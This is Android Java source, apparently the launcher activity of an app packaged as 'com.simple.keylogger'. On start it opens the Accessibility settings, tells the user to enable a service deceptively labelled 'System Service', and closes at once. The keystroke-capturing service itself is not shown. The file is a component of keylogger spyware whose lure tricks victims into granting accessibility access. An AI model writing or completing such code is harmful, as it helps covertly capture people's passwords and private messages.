package com.simple.keylogger;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Mở Accessibility settings
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
        
        Toast.makeText(this, "Please enable 'System Service' in Accessibility settings", Toast.LENGTH_LONG).show();
        
        // Đóng app
        finish();
    }
}